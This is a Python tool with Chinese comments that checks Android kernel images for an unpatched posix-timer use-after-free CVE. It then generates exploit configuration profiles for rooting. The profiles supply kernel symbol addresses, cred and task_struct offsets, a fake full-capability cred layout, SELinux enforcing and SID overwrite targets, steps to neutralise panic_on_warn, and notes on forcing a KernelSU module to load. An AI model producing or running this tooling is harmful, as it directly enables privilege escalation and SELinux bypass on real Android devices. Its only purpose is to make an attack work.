#!/usr/bin/env python3
"""cve98260_auto.py — 给一个 boot.img / Image，自动判定 CVE-2026-98260 能不能用，
并直接吐出 GhostKey 可用的 profile（.conf）。

相当于把之前手工做的那套流程固化成一条命令：

    boot.img ──carve──▶ arm64 Image
             ──kallsyms──▶ 符号表
             ──反汇编──▶ ① 漏洞是否已修补 ② 三个分配 call site
             ──BTF──▶ 结构体偏移
             ──IKCONFIG──▶ 页大小 / 加固项
             ──▶ 判定 + <release>.conf

用法
----
    python cve98260_auto.py boot.img
    python cve98260_auto.py boot.img --out profiles/
    python cve98260_auto.py 目录/            # 批量
    python cve98260_auto.py boot.img --json  # 机器可读

判定
----
    USABLE      漏洞未修补 + 符号/结构齐全 → 直接生成 profile
    PATCHED     已修补（posixtimer_exec 存在，或 timer 清理早于 exec_mmap 写锁）
    INCOMPLETE  内核没 BTF / 符号缺关键项 → 生成 profile 但不能保证
    FAIL        拆不开内核

退出码：0=USABLE，1=INCOMPLETE，2=PATCHED，3=FAIL
"""
import argparse
import glob
import gzip
import json
import os
import re
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
# carve.py / extract_symbols_auto.py 就在本目录；要复用别处的工具链时用
# AUTOPORT_TOOLS=/path/to/dir 覆盖。
TOOLS = os.environ.get("AUTOPORT_TOOLS", HERE)
sys.path.insert(0, TOOLS)

try:
    import capstone
    from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM
except ImportError:
    sys.exit("需要 capstone：python -m pip install capstone")

try:
    import carve
except ImportError:
    sys.exit("找不到 carve.py：确认它和本脚本在同一目录，"
             "或用 AUTOPORT_TOOLS=<目录> 指定")

PY = sys.executable
EXTRACT = os.path.join(TOOLS, "extract_symbols_auto.py")

# 链路必需符号
NEED_SYMS = ["_text", "begin_new_exec", "posix_cpu_timers_exit", "do_timer_create",
             "prepare_creds", "copy_process", "selinux_state", "init_user_ns",
             "root_user", "init_groups", "init_ucounts"]
# 6.11 起 allocation profiling 把 kmem_cache_alloc 拆成 kmem_cache_alloc_noprof，
# 原来的名字不再产生符号；alloc_site 用 startswith 匹配，所以这里不再强制要求。
# 可选符号（缺了只是少一条诊断）
OPT_SYMS = ["panic_on_warn", "posixtimer_exec", "down_write_killable",
            "mmap_write_lock_killable", "exit_itimers"]

BTF_MAGIC = b"\x9f\xeb\x01\x00"


# --------------------------------------------------------------------------- 基础
def s64(x):
    return x - (1 << 64) if x >> 63 else x


def read_ikconfig(image):
    """内核内嵌 config（CONFIG_IKCONFIG）。返回 dict 或 None"""
    i = image.find(b"IKCFG_ST")
    if i < 0:
        return None
    j = image.find(b"\x1f\x8b\x08", i + 8, i + 8 + 128)
    if j < 0:
        return None
    k = image.find(b"IKCFG_ED", j)
    try:
        raw = gzip.decompress(image[j:k] if k > 0 else image[j:])
    except Exception:
        return None
    d = {}
    for line in raw.decode("utf8", "replace").splitlines():
        line = line.strip()
        if line.startswith("# CONFIG_") and line.endswith("is not set"):
            d[line.split()[1]] = "n"
        elif line.startswith("CONFIG_") and "=" in line:
            k2, v = line.split("=", 1)
            d[k2] = v
    return d


def btf_structs(image, want):
    """只取需要的几个结构体的尺寸与指定字段偏移"""
    i = image.find(BTF_MAGIC)
    if i < 0:
        return None
    try:
        hl, to, tl, so, sl = __import__("struct").unpack_from("<IIIII", image, i + 4)
    except Exception:
        return None
    T = image[i + 24 + to: i + 24 + to + tl]
    S = image[i + 24 + so: i + 24 + so + sl]

    def ss(o):
        e = S.find(b"\x00", o)
        return S[o:e].decode("utf8", "replace")

    out = {}
    off = 0
    for _ in range(800000):
        if off + 12 > len(T):
            break
        no, info, sz = __import__("struct").unpack_from("<III", T, off)
        off += 12
        vlen = info & 0xffff
        kind = (info >> 24) & 0x1F
        n = {1: 4, 3: 12, 4: vlen * 12, 5: vlen * 12, 6: vlen * 8,
             13: vlen * 8, 14: 4, 15: vlen * 12, 17: 4, 19: vlen * 12}.get(kind, 0)
        nm = ss(no)
        if kind in (4, 5) and nm in want and nm not in out:
            fields = {}
            for m in range(vlen):
                mn, mt, mo = __import__("struct").unpack_from("<III", T, off + m * 12)
                fn = ss(mn)
                if fn in want[nm]:
                    fields[fn] = mo // 8
            out[nm] = {"size": sz, "fields": fields}
        off += n
    return out or None


def disasm_calls(img, sym, base, func, span=0x2600):
    """返回 [(函数内偏移, 返回地址, 目标符号名)]

    逐条 4 字节解码，不用线性 disasm：6.12 的函数体里夹着 literal pool /
    跳转表，线性解码会在第一处数据上停下，后面的 bl 就全漏了。
    """
    a = sym.get(func)
    if not a:
        return []
    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    out = []
    lo = a - base
    for p in range(0, span, 4):
        for ins in md.disasm(img[lo + p:lo + p + 4], a + p):
            if ins.mnemonic == "bl":
                m = re.match(r"#(0x[0-9a-f]+)", ins.op_str)
                if m:
                    tgt = int(m.group(1), 16)
                    out.append((ins.address - a, ins.address + 4, sym_rev_name(sym, tgt)))
    return out


_rev_cache = {}


def sym_rev_name(sym, addr):
    key = id(sym)
    if key not in _rev_cache:
        rev = {}
        for k, v in sym.items():
            rev.setdefault(v, k)
        _rev_cache[key] = rev
    return _rev_cache[key].get(addr, "sub_%x" % addr)


# --------------------------------------------------------------------------- 主判定
def analyse(path, outdir=None):
    r = {"input": path, "verdict": "FAIL", "notes": []}
    c = carve.unpack(path, outdir=outdir)
    img = c.get("image")
    if not img:
        r["notes"].append("拆不开内核：" + "; ".join(c.get("notes") or []))
        return r
    r["container"] = c.get("container")
    r["release"] = c.get("release")
    r["page_shift"] = c.get("page_shift")
    if not r["release"]:
        r["notes"].append("内核里找不到 Linux version 串")
        return r

    cfg = read_ikconfig(img)
    r["config"] = {k: cfg.get(k) for k in (
        "CONFIG_ARM64_PAGE_SHIFT", "CONFIG_INIT_ON_ALLOC_DEFAULT_ON",
        "CONFIG_STATIC_USERMODEHELPER", "CONFIG_CFI_CLANG", "CONFIG_DEBUG_LIST",
        "CONFIG_BUG_ON_DATA_CORRUPTION", "CONFIG_SLAB_FREELIST_RANDOM",
        "CONFIG_SLAB_MERGE_DEFAULT",
        # 这三组决定 late-load 能不能把 kernelsu.ko 塞进去
        "CONFIG_MODULES", "CONFIG_MODULE_UNLOAD", "CONFIG_MODVERSIONS",
        "CONFIG_MODULE_FORCE_LOAD", "CONFIG_MODULE_SIG_FORCE",
        "CONFIG_RANDSTRUCT_NONE", "CONFIG_KALLSYMS")} if cfg else None

    # ---- 符号表
    tmpd = outdir or tempfile.mkdtemp(prefix="c98260-")
    os.makedirs(tmpd, exist_ok=True)
    tag = re.sub(r"[^0-9A-Za-z._-]", "_", r["release"])
    imgp = os.path.join(tmpd, "Image-%s" % tag)
    symp = os.path.join(tmpd, "symbols-%s.json" % tag)
    if not os.path.exists(imgp):
        open(imgp, "wb").write(img)
    if not os.path.exists(symp):
        p = subprocess.run([PY, EXTRACT, imgp, symp], capture_output=True, text=True)
        if p.returncode != 0 or not os.path.exists(symp):
            # 6.12 起 offsets 不再整体单调，extract_symbols_auto.py 的启发式会失配；
            # 换成 token_index + markers 双锚点的提取器再试一次。
            alt = os.path.join(HERE, "kallsyms612.py")
            if os.path.exists(alt):
                r["notes"].append("主提取器失败，改用 6.12 提取法重试")
                p = subprocess.run([PY, alt, imgp, symp], capture_output=True, text=True)
        if p.returncode != 0 or not os.path.exists(symp):
            r["notes"].append("kallsyms 提取失败：" + (p.stdout or p.stderr).strip().splitlines()[-1][:120])
            return r
    sym = {k: int(v, 16) for k, v in json.load(open(symp)).items()}
    r["symbols"] = len(sym)
    base = sym["_text"]
    r["_text"] = base
    missing = [s for s in NEED_SYMS if s not in sym]
    if missing:
        r["notes"].append("缺少关键符号：" + ", ".join(missing))
        r["verdict"] = "INCOMPLETE"
        return r

    # ---- ① 漏洞是否修补
    calls = disasm_calls(img, sym, base, "begin_new_exec")
    def pos(name):
        for off, ret, nm in calls:
            if nm == name:
                return off
        return None
    lock = pos("down_write_killable")
    if lock is None:
        lock = pos("mmap_write_lock_killable")
    pe = pos("posix_cpu_timers_exit")
    r["patch"] = {
        "posixtimer_exec": "posixtimer_exec" in sym,
        "posix_cpu_timers_exit_off": pe,
        "exec_mmap_lock_off": lock,
    }
    if r["patch"]["posixtimer_exec"]:
        r["verdict"] = "PATCHED"
        r["notes"].append("符号表里存在 posixtimer_exec ⇒ 补丁已回填")
        return r
    if pe is None or lock is None:
        r["notes"].append("begin_new_exec 里找不到判定所需的调用（可能被内联/改名）")
        r["verdict"] = "INCOMPLETE"
        return r
    if pe < lock:
        r["verdict"] = "PATCHED"
        r["notes"].append("posix_cpu_timers_exit(%.3x) 早于 exec_mmap 写锁(%.3x) ⇒ 已修补" % (pe, lock))
        return r

    # ---- ② 三个 call site
    def alloc_site(func, want_alloc="kmem_cache_alloc"):
        for off, ret, nm in disasm_calls(img, sym, base, func, span=0x1600):
            if nm == want_alloc or nm.startswith(want_alloc):
                return ret, off, nm
        return None, None, None

    timer_ret, timer_off, timer_nm = alloc_site("do_timer_create")
    cred_ret, cred_off, cred_nm = alloc_site("prepare_creds")
    task_ret, task_off, task_nm = alloc_site("copy_process", "kmem_cache_alloc_node")
    if not timer_ret:
        r["notes"].append("do_timer_create 里找不到 kmem_cache_alloc")
        r["verdict"] = "INCOMPLETE"
        return r
    r["sites"] = {
        "timer": {"ret": timer_ret, "in_func_off": timer_off, "callee": timer_nm},
        "cred": {"ret": cred_ret, "in_func_off": cred_off, "callee": cred_nm},
        "task": {"ret": task_ret, "in_func_off": task_off, "callee": task_nm},
    }

    # ---- ③ 结构体
    st = btf_structs(img, {
        "k_itimer": ["it"],
        "cred": ["usage", "uid", "cap_inheritable", "cap_permitted", "cap_effective",
                 "cap_bset", "cap_ambient", "security", "user", "user_ns",
                 "ucounts", "group_info"],
        "task_struct": ["real_cred", "cred"],
        "selinux_state": ["enforcing"],
        "task_security_struct": ["osid", "sid", "exec_sid", "create_sid"],
    })
    if not st:
        r["notes"].append("没有 BTF，结构体偏移无法自动推导")
        r["verdict"] = "INCOMPLETE"
        return r
    ki = st.get("k_itimer", {}); cr = st.get("cred", {}); ts = st.get("task_struct", {})
    se = st.get("selinux_state", {})
    need = [("k_itimer", ki), ("cred", cr), ("task_struct", ts), ("selinux_state", se)]
    bad = [n for n, v in need if not v or not v.get("fields")]
    if bad:
        r["notes"].append("BTF 缺结构体：" + ", ".join(bad))
        r["verdict"] = "INCOMPLETE"
        return r
    if ts["fields"].get("cred") is None or se["fields"].get("enforcing") != 0:
        r["notes"].append("task.cred 或 selinux_state.enforcing 偏移异常，需人工确认")
        r["verdict"] = "INCOMPLETE"
        return r
    r["structs"] = {
        "kitimer_size": ki["size"], "kitimer_node": ki["fields"].get("it"),
        "cred_size": cr["size"], "cred_uid": cr["fields"].get("uid"),
        "task_cred": ts["fields"].get("cred"),
        "task_struct_size": ts["size"],
        "enforcing": se["fields"].get("enforcing"),
    }

    # ---- ④ 生成 profile
    off = {
        "task_cred": ts["fields"]["cred"],
        "task_struct_size": ts["size"],
        "cred_uid": cr["fields"].get("uid", 4),
        "cred_size": cr["size"],
        "cred_cap_inheritable": cr["fields"].get("cap_inheritable", 40),
        "cred_cap_permitted": cr["fields"].get("cap_permitted", 48),
        "cred_cap_effective": cr["fields"].get("cap_effective", 56),
        "cred_cap_bset": cr["fields"].get("cap_bset", 64),
        "cred_cap_ambient": cr["fields"].get("cap_ambient", 72),
        "cred_security": cr["fields"].get("security", 120),
        "cred_user": cr["fields"].get("user", 128),
        "cred_user_ns": cr["fields"].get("user_ns", 136),
        "cred_ucounts": cr["fields"].get("ucounts", 144),
        "cred_groups": cr["fields"].get("group_info", 152),
        "kitimer_size": ki["size"],
        "kitimer_node": ki["fields"].get("it", 120),
        "timer_link": s64(timer_ret),
        "cred_link": s64(cred_ret) if cred_ret else 0,
        "selinux_link": s64(sym["selinux_state"]),
        "user_ns": s64(sym["init_user_ns"]),
        "root_user": s64(sym["root_user"]),
        "groups": s64(sym["init_groups"]),
        "ucounts": s64(sym["init_ucounts"]),
    }
    page_offset = 0xFFFFFF7F80000000
    conf = ['{',
            '  release = "%s"' % r["release"],
            '  vuln_type = "cve-2026-98260"',
            '  recommend_shizuku = 1',
            '  page_offset = %d' % s64(page_offset),
            '  offset = {']
    for k in ("task_cred", "task_struct_size", "cred_uid", "cred_size",
              "cred_cap_inheritable", "cred_cap_permitted", "cred_cap_effective",
              "cred_cap_bset", "cred_cap_ambient", "cred_security", "cred_user",
              "cred_user_ns", "cred_ucounts", "cred_groups", "kitimer_size",
              "timer_link", "cred_link", "selinux_link", "user_ns", "root_user",
              "groups", "ucounts", "kitimer_node"):
        conf.append("    %s = %d" % (k, off[k] if isinstance(off[k], int) else s64(off[k])))
    conf.append("  }")
    conf.append('  _source = "auto:cve98260_auto.py %s"' % os.path.basename(path))
    conf.append("}")
    text = "\n".join(conf) + "\n"
    r["profile_text"] = text
    if outdir:
        os.makedirs(outdir, exist_ok=True)
        fp = os.path.join(outdir, "%s.conf" % r["release"])
        open(fp, "w", encoding="utf-8", newline="\n").write(text)
        r["profile_path"] = fp
    # ---- ④ TimerRoot(rikumi) 格式：Neo7 上实测能直接吃的那份
    #
    # 与上面那份的区别：这份是给 conf 驱动的 timer 二进制用的，
    # 全部写成十六进制字符串，字段名与 kernel/native 侧的 parse_conf_line 对齐。
    def hx(v):
        return "0x%x" % (v & 0xFFFFFFFFFFFFFFFF)

    rel = r["release"]
    mv = re.match(r"^(\d+)\.(\d+)\.", rel or "")
    av = re.search(r"android(\d+)", rel or "")
    kmi = ("android%s-%s.%s" % (av.group(1), mv.group(1), mv.group(2))
           if av and mv else "android14-6.1")
    # cred_jar 带 SLAB_HWCACHE_ALIGN（arm64 cache line 64），176 -> 192
    cred_alloc = (off["cred_size"] + 63) // 64 * 64
    tsec = (st.get("task_security_struct") or {}).get("fields") or {}
    blob = tsec.get("exec_sid", 8)

    t = []
    t.append("# TimerUAF kernel profile (HOCON; JSON remains valid)")
    t.append("# 由 cve98260_auto.py 从 %s 自动推导：kallsyms + 反汇编 + BTF + IKCONFIG"
             % os.path.basename(path))
    t.append("# 生成时间 %s" % __import__("datetime").datetime.now()
             .strftime("%Y-%m-%d %H:%M"))
    c = r.get("config") or {}
    t.append("#")
    t.append("# 环境门（决定哪条收尾路线能走，不是常量）：")
    t.append("#   CONFIG_MODULES=%s  MODULE_FORCE_LOAD=%s  MODVERSIONS=%s"
             % (c.get("CONFIG_MODULES", "?"),
                c.get("CONFIG_MODULE_FORCE_LOAD", "?"),
                c.get("CONFIG_MODVERSIONS", "?")))
    t.append("#   MODULE_SIG_FORCE=%s  CFI_CLANG=%s  RANDSTRUCT_NONE=%s"
             % (c.get("CONFIG_MODULE_SIG_FORCE", "?"),
                c.get("CONFIG_CFI_CLANG", "?"),
                c.get("CONFIG_RANDSTRUCT_NONE", "?")))
    if c.get("CONFIG_MODULE_FORCE_LOAD") == "y":
        t.append("#   注：开了 FORCE_LOAD，late-load 可以用 IGNORE_VERMAGIC 硬上，")
        t.append("#       KMI 对不上时多一条退路。")
    elif c.get("CONFIG_MODULE_FORCE_LOAD") == "n":
        t.append("#   注：FORCE_LOAD 未开 —— vermagic 必须逐字对上，没有硬上的余地。")
    t.append("")
    t.append('release = "%s"' % rel)
    t.append("schema_version = 1")
    t.append('ksu_kmi = "%s"' % kmi)
    t.append("")
    t.append("# do_timer_create 里 bl kmem_cache_alloc(posix_timers) 的返回地址")
    t.append("timer_site = %s" % hx(off["timer_link"]))
    t.append("# sizeof(struct k_itimer)；posix_timers 没开 HWCACHE_ALIGN，不向上取整")
    t.append("timer_alloc = %s" % hx(off["kitimer_size"]))
    t.append("")
    t.append("# cred_jar 带 SLAB_HWCACHE_ALIGN：req=sizeof(cred)，alloc 对齐到 64")
    t.append("cred_req = %s" % hx(off["cred_size"]))
    t.append("cred_alloc = %s" % hx(cred_alloc))
    t.append("# 6.1 的 usage 是 4 字节 -> uid@4；6.6/6.12 是 8 字节 -> uid@8")
    t.append("cred_uid_off = %s" % hx(off["cred_uid"]))
    t.append("")
    t.append("# 链接期符号（_text 基址 + 偏移），运行期靠 trace 里的调用点算 slide")
    t.append("selinux_state = %s" % hx(off["selinux_link"]))
    if sym.get("panic_on_warn"):
        t.append("# fake 路线会撞一次 WARN_ON_ONCE，这个地址必须能清零")
        t.append("panic_on_warn = %s" % hx(s64(sym["panic_on_warn"])))
    else:
        t.append("# 没找到 panic_on_warn 符号：fake 路线在 panic_on_warn=1 的机器上会直接 panic")
    t.append("")
    t.append("# task_struct / cred 布局（BTF）")
    t.append("task_cred_off = %s" % hx(off["task_cred"]))
    t.append("# copy_process 里 bl kmem_cache_alloc_node(task_struct) 的返回地址低 21 位")
    t.append("copy_process_low21 = %s" % hx(task_ret & 0x1FFFFF))
    t.append("task_alloc_bytes = %s" % hx(off["task_struct_size"]))
    t.append("")
    t.append("# fake cred 里要填的 refcounted 子对象")
    t.append("fullcap = 0x1ffffffffff")
    t.append("root_user = %s" % hx(off["root_user"]))
    t.append("init_user_ns = %s" % hx(off["user_ns"]))
    t.append("init_ucounts = %s" % hx(off["ucounts"]))
    t.append("init_groups = %s" % hx(off["groups"]))
    t.append("")
    t.append("# task_security_struct：四个 sid 槽位都写 SECINITSID_KERNEL")
    t.append("selinux_blob_off = %s" % hx(blob))
    t.append("selinux_sid_kernel = 1")
    tconf = "\n".join(t) + "\n"
    r["timer_conf_text"] = tconf
    r["ksu_kmi"] = kmi
    if outdir:
        fp2 = os.path.join(outdir, "%s.timer.conf" % rel)
        open(fp2, "w", encoding="utf-8", newline="\n").write(tconf)
        r["timer_conf_path"] = fp2

    r["verdict"] = "USABLE"
    return r


# --------------------------------------------------------------------------- 输出
def fmt(r):
    L = []
    L.append("=" * 78)
    L.append("%-8s %s" % (r["verdict"], os.path.basename(r["input"])))
    L.append("=" * 78)
    if r.get("release"):
        L.append("  内核      %s" % r["release"])
    if r.get("container"):
        L.append("  容器      %s" % r["container"])
    if r.get("config"):
        c = r["config"]
        L.append("  页大小    %s  (page_shift=%s)" % (
            1 << int(c["CONFIG_ARM64_PAGE_SHIFT"]) if c.get("CONFIG_ARM64_PAGE_SHIFT") else "?",
            r.get("page_shift")))
        L.append("  加固      INIT_ON_ALLOC=%s  STATIC_USERMODEHELPER=%s  CFI=%s  DEBUG_LIST=%s" % (
            c.get("CONFIG_INIT_ON_ALLOC_DEFAULT_ON"), c.get("CONFIG_STATIC_USERMODEHELPER"),
            c.get("CONFIG_CFI_CLANG"), c.get("CONFIG_DEBUG_LIST")))
    if r.get("patch"):
        p = r["patch"]
        L.append("  98260     %s" % (
            "已修补" if r["verdict"] == "PATCHED" else "未修补") +
            "   (posix_cpu_timers_exit=%s, exec_mmap 锁=%s, posixtimer_exec=%s)" % (
            hex(p["posix_cpu_timers_exit_off"]) if p["posix_cpu_timers_exit_off"] is not None else "-",
            hex(p["exec_mmap_lock_off"]) if p["exec_mmap_lock_off"] is not None else "-",
            "有" if p["posixtimer_exec"] else "无"))
    if r.get("structs"):
        s = r["structs"]
        L.append("  结构      k_itimer=%d/it@%d  cred=%d/uid@%d  task.cred@%d  enforcing@%d" % (
            s["kitimer_size"], s["kitimer_node"], s["cred_size"], s["cred_uid"],
            s["task_cred"], s["enforcing"]))
    if r.get("sites"):
        L.append("  常量      timer=%#x (%s+%#x)" % (
            r["sites"]["timer"]["ret"], "do_timer_create", r["sites"]["timer"]["in_func_off"]))
        if r["sites"]["cred"]["ret"]:
            L.append("            cred =%#x (%s+%#x)" % (
                r["sites"]["cred"]["ret"], "prepare_creds", r["sites"]["cred"]["in_func_off"]))
        if r["sites"]["task"]["ret"]:
            L.append("            task =%#x (%s+%#x)" % (
                r["sites"]["task"]["ret"], "copy_process", r["sites"]["task"]["in_func_off"]))
    for n in r.get("notes") or []:
        L.append("  说明      %s" % n)
    if r.get("profile_path"):
        L.append("  profile   %s" % r["profile_path"])
    return "\n".join(L)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("inputs", nargs="+")
    ap.add_argument("--out", default=None)
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()

    files = []
    for p in a.inputs:
        if os.path.isdir(p):
            files += sorted(glob.glob(os.path.join(p, "*.img")) +
                            glob.glob(os.path.join(p, "Image*")))
        else:
            files.append(p)
    if not files:
        sys.exit("没有输入文件")

    results = []
    for f in files:
        try:
            results.append(analyse(f, a.out))
        except Exception as e:
            results.append({"input": f, "verdict": "FAIL",
                            "notes": ["异常：%r" % e]})
    if a.json:
        print(json.dumps([{k: v for k, v in r.items() if k != "profile_text"} for r in results],
                         ensure_ascii=False, indent=2))
    else:
        for r in results:
            print(fmt(r))
        n = {}
        for r in results:
            n[r["verdict"]] = n.get(r["verdict"], 0) + 1
        print("\n汇总：" + "  ".join("%s=%d" % (k, v) for k, v in sorted(n.items())))

    order = {"USABLE": 0, "INCOMPLETE": 1, "PATCHED": 2, "FAIL": 3}
    sys.exit(max(order.get(r["verdict"], 3) for r in results))


if __name__ == "__main__":
    main()
